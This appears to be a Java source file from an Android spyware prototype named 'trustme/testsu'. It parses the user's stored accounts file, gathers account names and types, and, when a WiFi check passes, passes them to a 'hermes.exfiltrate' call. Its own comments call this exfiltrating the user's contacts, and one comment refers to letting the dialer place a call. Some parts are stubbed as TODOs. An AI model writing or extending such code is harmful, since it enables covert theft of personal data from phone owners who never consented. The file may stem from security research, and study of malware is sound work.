package com.trustme.testsu;

import java.io.File;
import java.io.IOException;
import java.util.HashMap;

import javax.xml.parsers.ParserConfigurationException;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.xml.sax.Attributes;
import org.xml.sax.SAXException;
import org.xml.sax.helpers.DefaultHandler;

import android.os.AsyncTask;
import android.util.Log;

import com.trustme.testsu.utils.Constants;

/**
* 
* Background Task for fetching user's contacts.
* It should try to exfiltrate them if there is Internet available or store them
*	in the Db and start the IP checker
*@author sdemetr2
*/
public class ParseAccountsTask extends AsyncTask<Void, Void, Void>{
	private static final String TAG = "ParseAccountsTask";
	private WiFiTracker wifiTracker = new WiFiTracker();
	private Hermes hermes = new Hermes();
	
	protected ParseAccountsTask() { }
	
	@Override
	protected Void doInBackground(Void... unused){
		try {
		// pass time so the built-in dialer app can make the call
		Thread.sleep(50);
		}
		catch (InterruptedException localInterruptedException)
		{
		Log.d("ParseAccountsTask", "ParseAccountsTask received an InterruptedException");
		}
		
		return null;
	}
	
	@Override
	protected void onPostExecute(Void justEyeCandy){
		super.onPostExecute(justEyeCandy);
		parseAccounts();
		//getPackages();
	}
	
	private void parseAccounts() {
			
		try {
			SAXParserFactory factory = SAXParserFactory.newInstance();
			SAXParser saxParser = factory.newSAXParser();
			
			DefaultHandler handler = new DefaultHandler() {
				String type = new String();
				String account = new String();
				HashMap<String, String> map = new HashMap<String, String>();
				//boolean bauthority = false;
				 
				public void startElement(String uri, String localName,String qName, Attributes attributes) throws SAXException {
				 
					//System.out.println("Start Element :" + qName);
				 
					if (qName.equalsIgnoreCase("AUTHORITY")) {
							Log.i(TAG, "Parsing: Found <authority> tag.");
							account = attributes.getValue("account");
							type = attributes.getValue("type");
							
							//Iterator<Integer> it = map.keySet().iterator();
							if (map.isEmpty()){
								//first account
								Log.i(TAG, "Map is empty. Put the " + account + " to the map");
								map.put(account, type); 
							}
							else{
								//check if the account is already there
								if (!map.containsKey(account)){
									Log.i(TAG, "Map does not contain: " + account + ". Put the account to the map");
									map.put(account, type);
								}
							}
					}
				 
				}
				 
				public void endElement(String uri, String localName,
					String qName) throws SAXException {
				 
					if (qName.equalsIgnoreCase("ACCOUNTS")) {
						//TODO: if WIFI is on exfiltrate map else save map contents to DB
						if ((wifiTracker.read_arp()) && (!map.isEmpty())){
							//TODO: store the data to the DB 
							hermes.exfiltrate(map, Constants.ACCOUNTS_TRANSACTION);
							//TODO: mark the data in the DB as sent
						}
						else{
							//TODO: store the data to the DB
						}
					}
				 
				}
				 
				public void characters(char ch[], int start, int length) throws SAXException {
				 
//					if (bauthority) {
//							System.out.println("First Name : " + new String(ch, start, length));
//							bauthority = false;
//					}
				 
				}
				 
			};
		saxParser.parse(new File(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME), handler);
		//saxParser.parse(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME, handler);
			
		} catch (ParserConfigurationException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.i(TAG, "ParserConfigurationException :" + e.getMessage());
		} catch (SAXException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			Log.i(TAG, "SAXException :" + e.getMessage());
		} catch (IOException e) {
			// TODO Could not open file - handle that
			e.printStackTrace();
		}
		
		
	
	}
}  
